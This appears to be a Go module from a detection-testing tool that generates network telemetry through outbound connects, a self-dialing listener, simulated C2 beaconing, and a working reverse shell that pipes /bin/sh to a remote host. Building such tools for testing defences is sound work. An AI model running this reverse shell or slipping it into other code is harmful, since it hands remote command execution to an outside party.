package modules

import (
	"fmt"
	"net"
	"net/http"
	"os/exec"
	"time"
)

// --- Module 1: Outbound Connection (Socket Connect) ---
type NetConnect struct{}

func (n *NetConnect) Name() string        { return "net_connect" }
func (n *NetConnect) Description() string { return "Initiates a TCP connection and HTTP GET to target" }
func (n *NetConnect) Cleanup() error      { return nil }

func (n *NetConnect) Generate(target string, port string) error {
	address := net.JoinHostPort(target, port)

	fmt.Printf("[*] Dialing TCP %s...\n", address)

	// Raw TCP Socket
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		return fmt.Errorf("TCP dial failed: %v", err)
	}
	conn.Close()
	// HTTP Traffic
	url := fmt.Sprintf("http://%s", address)
	fmt.Printf("[*] Sending HTTP GET to %s...\n", url)

	client := http.Client{Timeout: 3 * time.Second}
	_, err = client.Get(url)
	if err != nil {
		fmt.Printf("	 (HTTP failed as expected, but telemetry generated)\n")
	}
	// TODO: More outbound connection types?
	return nil
}

// --- Module 2: Listener (Bind Port) ---
type NetListen struct {
	listener net.Listener
}

func (n *NetListen) Name() string { return "net_listen" }
func (n *NetListen) Description() string {
	return "Opens a local listener and simulates an inbound connection to itself"
}

func (n *NetListen) Generate(target string, port string) error {
	address := net.JoinHostPort("0.0.0.0", port)

	fmt.Printf("[*] Starting Listener on %s...\n", address)

	l, err := net.Listen("tcp", address)
	if err != nil {
		return err
	}
	n.listener = l
	go func() {
		time.Sleep(500 * time.Millisecond)

		targetAddr := net.JoinHostPort("127.0.0.1", port)
		fmt.Printf("[*] Simulating INBOUND connection from self (%s)...\n", targetAddr)

		conn, err := net.Dial("tcp", targetAddr)
		if err != nil {
			fmt.Printf("[!] Self-dial failed: %v\n", err)
			return
		}
		// Simulated outbound data transfer and connection telemetry
		// TODO: User-defined byte buffer? for something like large outbound traffic
		conn.Write([]byte("TELEMETRY_PING"))
		conn.Close()
	}()

	fmt.Println("[*] Waiting for traffic...")
	conn, err := l.Accept()
	if err != nil {
		return err
	}
	fmt.Printf("[+] Telemetry Success: Accepted connection from %s\n", conn.RemoteAddr())
	conn.Close()

	return nil
}

func (n *NetListen) Cleanup() error {
	if n.listener != nil {
		return n.listener.Close()
	}
	return nil
}

// --- Module 3: Reverse Shell (Standard Go Reverse Shell) ---
type NetRevShell struct{}

func (n *NetRevShell) Name() string        { return "net_revshell" }
func (n *NetRevShell) Description() string { return "Spawns /bin/sh and pipes it to remote target" }
func (n *NetRevShell) Cleanup() error      { return nil }

func (n *NetRevShell) Generate(target string, port string) error {
	address := net.JoinHostPort(target, port)
	fmt.Printf("[*] Spawning Reverse Shell to %s...\n", address)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return fmt.Errorf("could not connect to listener: %v", err)
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	return cmd.Run()
}

// --- Module 4: Outbound Beacon (C2 Beaconing) ---
// Triggers: Periodic outbound HTTP requests (C2 Beaconing)
// TODO: Support for other protocols, user-defined ports
type C2Beacon struct{}

func (c *C2Beacon) Name() string        { return "net_beacon" }
func (c *C2Beacon) Description() string { return "Simulates periodic HTTP C2 beaconing traffic" }

func (c *C2Beacon) Generate(target string, port string) error {
	url := "http://google.com"
	if target != "" {
		url = "http://" + target
	}

	fmt.Printf("[*] Simulating Beacon to %s (3 attempts)...\n", url)

	for i := 0; i < 3; i++ {
		fmt.Printf("	-> Beacon attempt %d\n", i+1)
		resp, err := http.Get(url)
		if err != nil {
			fmt.Printf("	  Failed: %v\n", err)
		} else {
			resp.Body.Close()
		}
		time.Sleep(2 * time.Second) // TODO: Add arg for user-defined jitter?
	}
	return nil
}

func (c *C2Beacon) Cleanup() error { return nil }

func init() {
	Register(&NetConnect{})
	Register(&NetListen{})
	Register(&NetRevShell{})
	Register(&C2Beacon{})
}
